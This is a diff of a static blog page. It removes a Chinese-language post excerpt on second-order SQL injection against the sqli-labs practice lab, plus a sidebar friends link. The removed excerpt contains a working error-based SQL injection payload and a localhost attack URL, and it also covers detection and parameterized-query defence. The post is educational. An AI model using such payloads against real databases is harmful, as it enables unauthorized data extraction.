class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p><code>second.php</code>从<code>result.txt</code>文件里读取记录，获取<code>$id</code>的值并代入SQL查询。具体攻击步骤如下：</p>
-<ul>
-<li><p>访问<code>index.php</code>，构造参数<code>id</code>值为<code>1&#39; and (select 1 from (select count(*),concat(version(),0x7e,floor(rand()*2))a from information_schema.tables group by a)b)#</code>，完整URL如下</p>
-<pre><code>http://localhost:8888/sqli-labs/Less-5/?id=1&apos; and (select 1 from (select count(*),concat(version(),0x7e,floor(rand()*2))a from information_schema.tables group by a)b)#
-</code></pre></li>
-<li><p><code>id</code>的值被写入了<code>result.txt</code></p>
-</li>
-<li>发起另一请求，访问<code>second.php</code></li>
-<li><p>SQL语句报错，回显出了数据库版本信息</p>
-<p>  <img src="/images/second-order-1.png" alt="second-order-1"></p>
-</li>
-</ul>
-<h1 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h1><p>就其本身来说就是个SQL注入，只不过触发方式相对隐晦了一些。一般情况下很难用自动化工具扫出来，最好可以白盒审计源代码，我一般在审计源码的时候会对所有数据库执行的语句做日志记录，对可能出现注入的点输入对应payload，然后查看日志来分析是否有注入问题。当然黑盒情况下也是可能找到二阶注入的，可以利用cloudeye等平台构造合适的payload（cloudeye支持callback哦）来发现这些隐晦的注入问题。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>二阶注入比普通的SQL注入更难检测，因为漏洞触发点并不在攻击者提交请求的页面。其防御方式和普通SQL注入没差别，使用参数化查询语句，分离数据和代码。w</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/06/22/Second-Order-SQL-Injection/">展开全文 >></a>
         </p>
       
 
@@ -1045,8 +773,6 @@
       
     
       
-      
-      
     
       
       
@@ -1058,15 +784,13 @@
     
     
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
       
         
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
-      
         
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
       
         
     </ul>
@@ -1153,18 +877,6 @@
     	</section>
     
 
-    
-    	<section class="tools-section tools-section-friends" q-show="friends">
-  		
-        <ul class="search-ul">
-          
-            <li class="search-li">
-              <a href="http://lvwei.me/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>呆子不开口</a>
-            </li>
-          
-        </ul>
-  		
-    	</section>
     
 
     
